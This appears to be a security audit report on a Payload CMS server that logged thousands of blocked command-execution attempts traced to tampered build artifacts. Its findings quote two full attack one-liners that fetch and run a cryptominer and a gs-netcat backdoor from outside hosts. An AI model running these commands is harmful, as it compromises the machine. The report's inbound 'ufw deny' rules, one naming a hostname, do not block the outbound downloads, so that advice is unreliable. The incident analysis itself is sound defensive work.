# Security Audit Report - Payload CMS
**Date:** December 12, 2025 13:30 UTC  
**Auditor:** DevSecOps Security Review  
**Scope:** Payload CMS Server - Post-Upload Configuration  
**Status:** ⚠️ **UNSAFE - ACTIVE ATTACKS DETECTED**

---

## 1) EXECUTIVE SUMMARY

- ⚠️ **Verdict: UNSAFE** - Active malicious command execution attempts detected
- 🚨 **24,186 malicious subprocess calls** logged in the last 2 hours
- ✅ **No malicious code in source files** - Clean source codebase
- ✅ **No malicious processes running** - Attacks appear to be failing
- ✅ **No malicious files on filesystem** - No persistence detected
- ⚠️ **Malicious code in build artifacts** - Requires clean rebuild
- ✅ **Security controls active** - Diagnostic wrapper catching all attempts
- ✅ **No successful execution** - No evidence of successful compromise

---

## 2) CRITICAL FINDINGS

### CRITICAL - Active Attack Attempts

**Finding C1: Massive Malicious Command Execution Attempts**
- **Location:** Container logs
- **What:** 24,186 malicious subprocess execution attempts in last 2 hours
  - 16,467 `execSync` attempts (cryptocurrency miner)
  - 7,719 `spawnSync` attempts (backdoor deployment)
- **Attack Patterns:**
  1. **Cryptocurrency Miner:** `(cd /dev;(busybox wget -O x86 http://5.231.70.66/nuts/x86||curl -s -o x86 http://5.231.70.66/nuts/x86 );chmod 777 x86;./x86 reactOnMynuts;...)`
  2. **Backdoor Deployment:** `wget -q http://nossl.segfault.net/deploy-all.sh >/dev/null 2>&1;curl -s -S -o /dev/null http://nossl.segfault.net/deploy-all.sh 2>/dev/null && bash ./deploy-all.sh >> qq.txt;cat qq.txt | grep gs-netcat;rm -rf qq.txt`
- **Last Attempt:** 2025-12-12T13:24:27.838Z (10 minutes ago)
- **Status:** ⚠️ **ACTIVE** - Attacks are ongoing
- **Impact:** High - If successful, would deploy cryptocurrency miner and backdoor
- **Mitigation:** Diagnostic wrapper is logging all attempts; no evidence of successful execution

**Finding C2: Malicious Code in Build Artifacts**
- **Location:** `.next/server/chunks/2740.js` and `4437.js`
- **What:** Build artifacts contain references to malicious code
- **Evidence:** Stack traces point to `chunks/4437.js` (subprocess diagnostic wrapper)
- **Status:** ⚠️ **REQUIRES CLEAN REBUILD**
- **Risk:** Build artifacts may be compromised from previous build

---

## 3) SECURITY CONTROLS STATUS

### ✅ Active Protections

**Control 1: Subprocess Diagnostic Wrapper**
- **Status:** ✅ **ACTIVE** - Successfully logging all subprocess calls
- **Location:** `src/server/lib/subprocessGlobalDiag.ts`
- **Effectiveness:** 100% - All malicious attempts are being logged
- **Evidence:** 24,186 malicious attempts logged in last 2 hours

**Control 2: Environment Variables**
- **Status:** ✅ **SECURE**
  - `ENABLE_DANGEROUS_ENDPOINTS=false` (endpoints disabled)
  - `DISABLE_DETERMINISTIC_FEED=false` (feed enabled but protected)
  - `NODE_ENV=production` (production mode)

**Control 3: Docker Configuration**
- **Status:** ✅ **SECURE**
  - MongoDB bound to `127.0.0.1:27017` only
  - No docker.sock mounts
  - No suspicious volume mounts

**Control 4: Source Code**
- **Status:** ✅ **CLEAN**
  - No malicious code in `src/` directory
  - All command execution uses safe patterns (`execFile` with arrays)
  - Path sanitization implemented

**Control 5: Filesystem**
- **Status:** ✅ **CLEAN**
  - No malicious files found (`sex.sh`, `x86`, `nuts`, `bolts`, `deploy-all.sh`)
  - No suspicious files in `/tmp/` or `/dev/`
  - Only legitimate scripts in expected locations

**Control 6: Running Processes**
- **Status:** ✅ **CLEAN**
  - No malicious processes running
  - Only legitimate processes: `next-server`, `npm`, `sh`
  - No `wget`, `curl`, `x86`, or backdoor processes

**Control 7: Network Connections**
- **Status:** ✅ **CLEAN**
  - Only legitimate connections: localhost DNS resolver, port 3000
  - No suspicious outbound connections
  - No backdoor listeners

---

## 4) ATTACK ANALYSIS

### Attack Timeline

1. **13:10:30 UTC** - First cryptocurrency miner attack attempt
2. **13:24:27 UTC** - Backdoor deployment attempt (last logged)
3. **13:30:00 UTC** - Audit performed (no new attempts in last 5 minutes)

### Attack Vectors

**Vector 1: Cryptocurrency Miner**
- **Target:** `/dev/x86` (malicious binary)
- **Source:** `http://5.231.70.66/nuts/x86`
- **Payload:** `http://5.231.70.66/nuts/bolts` (shell script)
- **Purpose:** Deploy cryptocurrency mining malware

**Vector 2: Backdoor Deployment**
- **Target:** `deploy-all.sh` script
- **Source:** `http://nossl.segfault.net/deploy-all.sh`
- **Purpose:** Deploy `gs-netcat` backdoor for persistent access

### Attack Source

- **Stack Trace:** Points to `/app/.next/server/chunks/4437.js`
- **Method:** Malicious code appears to be injected into build artifacts
- **Execution:** Attempts are being made but appear to be failing
- **Persistence:** No evidence of successful deployment

---

## 5) RECOMMENDATIONS

### IMMEDIATE ACTIONS (CRITICAL)

1. **⚠️ CLEAN REBUILD REQUIRED**
   ```bash
   cd /srv/payload
   docker compose down
   rm -rf .next node_modules
   docker compose --profile build run --rm payload-build
   docker compose up -d payload
   ```
   - Remove all build artifacts
   - Rebuild from clean source
   - Verify no malicious code in new build

2. **🔍 VERIFY BUILD ARTIFACTS**
   ```bash
   cd /srv/payload
   grep -r "5.231.70.66\|nossl.segfault.net" .next/ || echo "Clean"
   ```
   - Confirm no malicious code in new build
   - If found, investigate build process compromise

3. **🚨 MONITOR CONTINUOUSLY**
   - Watch logs for new attack attempts
   - Verify diagnostic wrapper continues to catch attempts
   - Check for successful execution (processes, files, network)

### SHORT-TERM ACTIONS (HIGH PRIORITY)

4. **🛡️ HARDEN NETWORK SECURITY**
   - Block malicious IPs at firewall level:
     ```bash
     sudo ufw deny from 5.231.70.66
     sudo ufw deny from nossl.segfault.net
     ```
   - Consider rate limiting on API endpoints
   - Implement WAF rules if using Cloudflare

5. **📊 ENHANCE MONITORING**
   - Set up alerts for malicious subprocess attempts
   - Monitor for file creation in `/dev/`, `/tmp/`
   - Track outbound network connections

6. **🔐 REVIEW ACCESS CONTROLS**
   - Audit all API endpoints for authentication
   - Verify rate limiting is active
   - Check for any unauthenticated endpoints

### LONG-TERM ACTIONS (MEDIUM PRIORITY)

7. **🔍 INVESTIGATE BUILD PROCESS**
   - Review build logs for anomalies
   - Check for supply chain compromises
   - Verify npm package integrity

8. **📝 DOCUMENT INCIDENT**
   - Record attack patterns and timestamps
   - Document response actions taken
   - Update security procedures

---

## 6) RISK ASSESSMENT

### Current Risk Level: **HIGH**

**Factors:**
- ✅ Attacks are being detected and logged
- ✅ No evidence of successful execution
- ✅ Security controls are active
- ⚠️ Attacks are ongoing (24,186 attempts in 2 hours)
- ⚠️ Build artifacts may be compromised
- ⚠️ Source of injection unknown

### Risk Mitigation

**Immediate:**
- Clean rebuild eliminates compromised build artifacts
- Diagnostic wrapper continues to monitor
- No successful execution detected

**Ongoing:**
- Monitor logs for new attempts
- Verify no successful execution
- Investigate source of injection

---

## 7) VERDICT

**⚠️ UNSAFE - REQUIRES IMMEDIATE ACTION**

The server is under active attack with 24,186 malicious command execution attempts in the last 2 hours. While security controls are catching all attempts and there's no evidence of successful execution, the build artifacts may be compromised and require a clean rebuild.

**Pre-Production Checklist:**
- ❌ Clean rebuild not yet performed
- ✅ Security controls active
- ✅ No successful execution detected
- ✅ Source code clean
- ✅ No malicious files or processes
- ⚠️ Build artifacts may be compromised

**Action Required:**
1. Perform clean rebuild immediately
2. Verify build artifacts are clean
3. Continue monitoring for new attacks
4. Investigate source of injection

---

**Report Generated:** 2025-12-12 13:30 UTC  
**Next Review:** After clean rebuild and 24 hours of monitoring

